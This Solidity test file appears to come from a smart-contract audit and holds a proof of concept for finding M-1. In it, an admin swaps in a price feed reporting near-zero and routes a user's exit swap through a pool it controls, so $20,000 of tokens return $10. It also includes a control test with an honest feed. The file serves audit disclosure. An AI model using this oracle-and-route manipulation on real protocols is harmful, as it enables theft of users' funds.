// SPDX-License-Identifier: MIT
pragma solidity 0.8.28;

import {Base} from "./Base.sol";
import {MockERC20, MockVault, MockFeed} from "./Mocks.sol";

/// PoC for M-1. The admin (Timelock, delay 0 on mainnet) sets a feed and a route for a token. A user who arms
/// with the Stable harbour AFTER that change gets the swap the admin configured. With a feed that reports a
/// near-zero price, the oracle-bounded minimum is ~0, and a pool the admin controls (the MockSwapRouter at a
/// near-zero rate stands in for it) takes the user's tokens for almost nothing.
contract AdminSwapConfigPoC is Base {
    MockERC20 internal tok;
    MockVault internal tokVault;
    MockFeed internal tokFeed;

    function setUp() public override {
        super.setUp();
        tok = new MockERC20(18);
        tokVault = new MockVault(tok, 1e18); // 1 share = 1 TOK
        tokFeed = new MockFeed(2_000e8); // honest price: 1 TOK = $2,000
    }

    function _route() internal view returns (bytes memory) {
        return abi.encodePacked(address(tok), uint24(3000), address(stable));
    }

    /// Control: with an honest feed, a bad pool can't fill the oracle-bounded minimum, so the swap is
    /// skipped and the owner gets the raw token. Nothing is lost.
    function test_control_honestFeed_badPoolIsSkipped() public {
        vm.startPrank(ADMIN);
        router.setFeed(address(tok), address(tokFeed), 90_000, 18);
        router.setRoute(address(tok), _route());
        vm.stopPrank();
        swap.setRate(1e6); // pool pays $1 per TOK, far below the $2,000 oracle price

        bytes32 posId = _setup(OWNER, tokVault, 10e18, 1, 100);
        _fireAlarm();
        vm.prank(KEEPER);
        router.exit(posId, pauseKey, 0);

        assertEq(tok.balanceOf(OWNER), 10e18, "owner got the raw token back");
        assertEq(stable.balanceOf(OWNER), 0, "no swap happened");
    }

    /// Exploit: the admin also points the feed at a contract it controls that reports $0.000001.
    /// minOut becomes ~0, the bad pool fills, and the owner's $20,000 of TOK comes back as $10.
    function test_poc_adminFeedAndRoute_takeStableHarbourExit() public {
        MockFeed evilFeed = new MockFeed(100); // $0.000001 with 8 decimals
        vm.startPrank(ADMIN);
        router.setFeed(address(tok), address(evilFeed), 90_000, 18);
        router.setRoute(address(tok), _route());
        vm.stopPrank();
        swap.setRate(1e6); // the admin's pool: $1 per TOK

        bytes32 posId = _setup(OWNER, tokVault, 10e18, 1, 100); // armed after the change, Stable harbour
        _fireAlarm();
        vm.prank(KEEPER);
        router.exit(posId, pauseKey, 0);

        assertEq(tok.balanceOf(OWNER), 0, "owner's TOK is gone");
        assertEq(stable.balanceOf(OWNER), 10e6, "owner got $10 for $20,000 of TOK");
        assertEq(tok.balanceOf(address(swap)), 10e18, "the pool kept the TOK");
    }
}
